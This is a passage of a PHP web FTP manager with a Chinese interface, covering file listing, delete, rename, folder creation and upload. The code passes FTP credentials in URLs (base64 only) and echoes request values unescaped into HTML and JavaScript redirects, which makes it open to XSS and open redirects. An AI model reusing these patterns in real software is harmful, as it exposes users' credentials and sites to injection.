                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#444444">改名</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">删除</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxFile = $cMaxFile + 1;
                                }
                                unset($current);
                                unset($split);
                        }
                        ?>
                </table>
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <tr class="tdbg"> 
                                <td height="21" colspan="5" align="center">
                                        共 <?php echo $cMaxDir;?> 个目录，<?php echo ($cMaxFile-$cMaxDir);?> 个文件 
                                </td>
                        </tr>
                </table>
                <?php 
                }
                elseif ($systype == "UNIX"){
                        //print_r($contents);
                        if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <?php 
                        ?>
                        <tr class="tdbg" width="30%">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="7%">类型</td>
                                <td align="center">名称</td>
                                <td align="center" width="10%">大小</td>
                                <td align="center" width="15%">修改时间</td>
                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">新建</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444;">上传</a> <a style="color:#444444" href="javascript:delitem();">删除</a> 压缩 解压</td>
                        </tr>
                        <?php 
                        $cMaxDir = 0;
                        ?>
                        <?php                       
                        foreach ($contents as $current){ 
                                ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                if (substr($split[1],0,1)=="d"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $split[8];?>"></td>
                                <td align="center">目录</td>
                                <?php 
                                if ($split[8] == "."){
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444"><?php echo ".";?></a></td>
                                <?php       
                                }
                                elseif ($split[8] == ".."){
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(substr(trim(request("dir")),0,strripos(trim(request("dir")), "/"))==""?"/":substr(trim(request("dir")),0,strripos(trim(request("dir")), "/")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444"><?php echo "..";?></a></td>
                                <?php       
                                }
                                else{
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir"))=="/"?trim(request("dir")).$split[8]:trim(request("dir"))."/".$split[8])."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444"><?php echo $split[8];?></a></td>
                                <?php 
                                }
                                ?>      
                                <td align="center"><?php echo $split[5];?></td>
                                <td align="center"><?php echo $split[6]." ".$split[7];?></td>
                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#444444">改名</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">删除</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxDir = $cMaxDir + 1;
                                }
                                unset($current);
                                unset($split);
                        }
                        $cMaxFile = $cMaxDir;
                        foreach ($contents as $current){ 
                                ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                if (substr($split[1],0,1)=="-"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxFile;?>" id="chidd<?php echo $cMaxFile;?>" value="<?php echo $split[8];?>"></td>
                                <td align="center">文件</td>
                                <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.download")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444"><?php echo $split[8];?></a></td>
                                <td align="center"><?php echo $split[5];?></td>
                                <td align="center"><?php echo $split[6]." ".$split[7];?></td>
                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#444444">改名</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#444444">删除</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxFile = $cMaxFile + 1;
                                }
                        }
                        
                        ?>
                </table>
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <tr class="tdbg"> 
                                <td height="21" colspan="5" align="center">
                                        共 <?php echo $cMaxDir;?> 个目录，<?php echo ($cMaxFile-$cMaxDir);?> 个文件 
                                </td>
                        </tr>
                </table>
                <?php 
                }
                ?>
         </td>
     </tr>
</form>
</table>        
                <?php                               
                break;
        case "ftp.remove":
                //print_r($_POST);
                if (trim(request("delok")) == "1"){
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>
        <script language="javascript">
                if(confirm('确定删除选中的<?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>?') == true){
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";
                }       
                else{   
                        alert("该<?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>删除取消！");
                        history.go(-1);
                }       
        </script>
                <?php 
                        break;
                     }
                }
                if (trim(request("type")) != ""){ 
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                        $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                        if ((!$conn_id) || (!$login_result)) {
                                AlertBack("FTP登陆失败！" , 1);
                        }  
                        $contents = ftp_rawlist($conn_id, trim(request("dir")));
                        if (ftp_systype($conn_id) == "Windows_NT"){
                                foreach ($contents as $current){ 
                                        ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                        if (trim(request("type")) == "file"){
                                                if (trim(request("filename")) == $split[8]){
                                                        $flag = "1";
                                                        break;
                                                }
                                        }       
                                        elseif (trim(request("type")) == "dir"){
                                                if (trim(request("dirname")) == $split[8]){
                                                        $flag = "1";
                                                        break;
                                                }
                                        }
                                        
                                        unset($current);
                                        unset($split);
                                }
                                if ($flag == "1"){
                                }
                                else{
                                        AlertBack("该文件或目录不存在！" , 2);
                                        return;
                                }
                        }
                        elseif (ftp_systype($conn_id) == "UNIX"){
                                foreach ($contents as $current){ 
                                        ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                        if (trim(request("type")) == "file"){
                                                if (trim(request("filename")) == $split[8]){
                                                        $flag = "1";
                                                        break;
                                                }
                                        }       
                                        elseif (trim(request("type")) == "dir"){
                                                if (trim(request("dirname")) == $split[8]){
                                                        $flag = "1";
                                                        break;
                                                }
                                        }
                                        unset($current);
                                        unset($split);
                                }
                                if ($flag == "1"){
                                }
                                else{
                                        AlertBack("该文件或目录不存在！" , 2);
                                        return;
                                }
                        }
                        if (trim(request("type")) == "file"){
                                $msg = @ftp_delete ($conn_id,trim(request("dir"))."/".trim(request("filename")));
                        }
                        elseif (trim(request("type")) == "dir"){
                                $msg = ftp_deldir ($conn_id,trim(request("dir"))."/".trim(request("dirname")));
                        }                       
                }
                elseif (trim(request("type")) == ""){
                        unset($split);
                        unset($contents);
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                        $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                        if ((!$conn_id) || (!$login_result)) {
                                AlertBack("FTP登陆失败！" , 1);
                        }  
                        $contents = ftp_rawlist($conn_id, trim(request("dir")));
                        $delcount = "0";
                        $msg = "wait";
                        $systype = ftp_systype($conn_id);// "UNIX";//
                        foreach ($contents as $current){ 
                                if ($systype == "Windows_NT"){
                                        ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                        for($i = 0;$i < count($contents);$i++){
                                                if ($_POST["chidd".$i] == $split[8]){
                                                        if ($split[7]=="<DIR>"){
                                                                $msg = ftp_deldir($conn_id,trim(request("dir"))."/".$_POST["chidd".$i]);
                                                        }
                                                        else{   
                                                                $msg = @ftp_delete($conn_id,trim(request("dir"))."/".$_POST["chidd".$i]);
                                                        }
                                                        $delcount = $delcount + 1;
                                                        break;
                                                }
                                        }
                                        if ($msg == true || $msg == "wait"){
                                                unset($current);
                                                unset($split);
                                        }
                                        elseif ($msg == false){
                                                unset($current);
                                                unset($split);
                                                break;
                                        }
                                }
                                elseif ($systype == "UNIX"){
                                        ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                        for($i = 0;$i < count($contents);$i++){
                                                if ($_POST["chidd".$i] == $split[8]){
                                                        if (substr($split[1],0,1)=="d"){
                                                                $msg = ftp_deldir($conn_id,trim(request("dir"))."/".$_POST["chidd".$i]);
                                                        }       
                                                        else{   
                                                                $msg = @ftp_delete($conn_id,trim(request("dir"))."/".$_POST["chidd".$i]);
                                                        }       
                                                        $delcount = $delcount + 1;
                                                        break;
                                                }
                                        }
                                        if ($msg == true || $msg == "wait"){
                                                unset($current);
                                                unset($split);
                                        }
                                        elseif ($msg == false){
                                                unset($current);
                                                unset($split);
                                                break;
                                        }
                                }
                        }
                }
                if ($msg == true){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        <?php 
                        if (trim(request("type")) != ""){
                        ?>
                                <?php if (trim(request("type")) == "file"){?>文件<?php }?><?php if (trim(request("type")) == "dir"){?>目录<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> 删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                        <?php 
                        }
                        elseif (trim(request("type")) == ""){
                        ?>
                                <?php echo $delcount;?> 个文件或目录删除成功！<?php  echo $timeout/1000?> 秒后返回上一页
                        <?php 
                        }
                        ?>
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       
                elseif ($msg == false){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php 
                if (trim(request("type")) != ""){
                ?>
                        <?php if (trim(request("type")) == "file"){?>文件<?php }?><?php if (trim(request("type")) == "dir"){?>目录<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> 删除失败！<?php  echo $timeout/1000?> 秒后返回上一页
                <?php 
                }
                elseif (trim(request("type")) == ""){
                ?>
                        文件或目录删除失败！<?php  echo $timeout/1000?> 秒后返回上一页
                <?php 
                }
                ?>              
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       
                elseif ($msg == "wait"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php 
                if (trim(request("type")) != ""){
                ?>
                        <?php if (trim(request("type")) == "file"){?>文件<?php }?><?php if (trim(request("type")) == "dir"){?>目录<?php }?> <?php echo trim(request("filename")) == ""?trim(request("dirname")):trim(request("filename"));?> 删除未成功！<?php  echo $timeout/1000?> 秒后返回上一页
                <?php 
                }
                elseif (trim(request("type")) == ""){
                ?>
                        文件或目录删除未成功！<?php  echo $timeout/1000?> 秒后返回上一页
                <?php 
                }
                ?>              
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       
                break;
        case "ftp.rename":
                $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                if ((!$conn_id) || (!$login_result)) {
                    AlertBack("FTP登陆失败！" , 1);
                }
                $contents = ftp_rawlist($conn_id, "/");
                //print_r($contents);
                if (ftp_systype($conn_id) == "Windows_NT"){
                        foreach ($contents as $current){ 
                                ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if (trim(request("to")) == $split[8]){
                                        AlertBack("已经存在该文件或目录名！" , 1);
                                        break;
                                        return; 
                                }
                                unset($current);
                                unset($split);
                        }
                }
                elseif (ftp_systype($conn_id) == "UNIX"){
                        foreach ($contents as $current){ 
                                ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                if (trim(request("to")) == $split[8]){
                                        AlertBack("已经存在该文件或目录名！" , 1);
                                        break;
                                        return; 
                                }
                                unset($current);
                                unset($split);
                        }
                }
                ftp_chdir ($conn_id,"/");
                $msg = ftp_rename($conn_id,trim(request("dir"))."/".trim(request("from")),trim(request("dir"))."/".trim(request("to")));
                if ($msg == true){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                文件或目录重命名成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       
                elseif ($msg == false){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                文件或目录重命名失败！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }                       

                break;  
        case "ftp.new":
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">&nbsp;FTP管理 -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;"><?php echo trim(request("dir"));?></a></td>
        </tr>
</table>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form enctype="multipart/form-data" action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor."&server=".encodeuri(trim(request("server")))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&port=".trim(request("port"));?>&action=<?php echo encodeuri("ftp.create");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>&refer=<?php echo encodeuri(trim(request("refer")));?>" method="POST" name="ftp">
                        &nbsp名称：<input type="text" class="text" name="name" value="" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        目录<input type="radio" name="type" value="dir" checked>
                        <noscript>
                        文件<input type="radio" name="type" value="file" >
                        </noscript>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>                
                <?php 
                break;  
        case "ftp.create":
                if (trim(request("name")) == ""){
                        if (trim($_POST["name"]) == ""){
                                AlertBack("文件或目录名为空" , 1);
                                break;
                        }
                        else{
                                AlertBack("文件或目录名为空！" , 2);
                                break;
                        }
                }
                If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }               
                }  
                elseif (trim($_POST["name"]) != ""){
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&name=".encodeuri(trim(request("name")))."&type=".encodeuri(trim(request("type")))."&refer=".encodeuri(trim(request("refer"))));
                        break;
                }
                $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                if ((!$conn_id) || (!$login_result)) {
                    AlertBack("FTP登陆失败！" , 1);
                }
                if (trim(request("type")) == "dir"){
                        $msg = @ftp_mkdir($conn_id,trim(request("dir"))."/".trim(request("name")));
                        if ($msg == trim(request("dir"))."/".trim(request("name"))){
                                $msg = true;
                        }
                }
                $timeout = "5000";
                if ($msg == true) {// check upload status
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php 
                if (trim(request("type")) == "dir"){
                ?>
                        目录 <?php echo trim(request("name"));?> 创建成功！<?php  echo $timeout/1000?> 秒后返回上一页   
                <?php                       
                }
                elseif (trim(request("type")) == "dir"){
                ?>
                        文件 <?php echo trim(request("name"));?> 创建成功！<?php  echo $timeout/1000?> 秒后返回上一页   
                <?php                       
                }
                ?>
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }
                elseif($msg == false){// check upload status
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php 
                if (trim(request("type")) == "dir"){
                ?>
                        目录 <?php echo trim(request("name"));?> 创建成功！<?php  echo $timeout/1000?> 秒后返回上一页   
                <?php                       
                }
                elseif (trim(request("type")) == "dir"){
                ?>
                        文件 <?php echo trim(request("name"));?> 创建成功！<?php  echo $timeout/1000?> 秒后返回上一页   
                <?php                       
                }
                ?>
                </td>
        </tr>   
                <?php 
                        echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                ?>
</table>                        
                <?php 
                }       
                break;          
        case "ftp.upload":
                //$pathdir = trim(request("dir"))==""?"/":trim(request("dir"));
                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">&nbsp;FTP管理 -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".trim(request("dir"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&dir=".encodeuri("/")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#444444;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("dir"));?></td>
        </tr>
</table>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form enctype="multipart/form-data" action="<?php echo ScriptPath()?>?api=ftp&skin=<?php echo $skincolor."&server=".encodeuri(trim(request("server")))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&port=".trim(request("port"));?>&action=<?php echo encodeuri("ftp.uploadfile");?>&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>&refer=<?php echo encodeuri(trim(request("refer")));?>" method="POST" name="ftp">
                        &nbsp文件路径：<input type="file" class="text" name="filepath" value="" style="height:20px;width:25%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp验证码：<input <?php echo $style->input("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        二进制：<input type="checkbox" id="binary" name="binary" value="1" />
                        <input type="hidden" class="text" name="timestamp" value="<?php echo time();?>" size="1"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                        <?php  echo ' '.'文件上传限制：'.ini_get("upload_max_filesize"); ?>
                </td>
        </tr>   
</table>                
                <?php 
                break;          
        case "ftp.uploadfile":
                if ($_FILES['filepath']['tmp_name'] == "" || $_FILES['filepath']['name'] == ""){
                        AlertBack("文件路径名为空！" , 1);
                        break;
                }
                If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }               
                }               
                //$pathdir = trim(request("dir"))==""?"/":trim(request("dir"));
                $serverport = trim(request("port"))==""?"21":trim(request("port"));
                if (trim(request("ssl")) == "1"){
                        $conn_id = ftp_ssl_connect(base64_decode(trim(request("server"))),$serverport);
                }
                else{
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))),$serverport);
                }       
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                @ftp_chdir($conn_id, "/");

                ?>
                <div id="bar"></div>
                <?php 

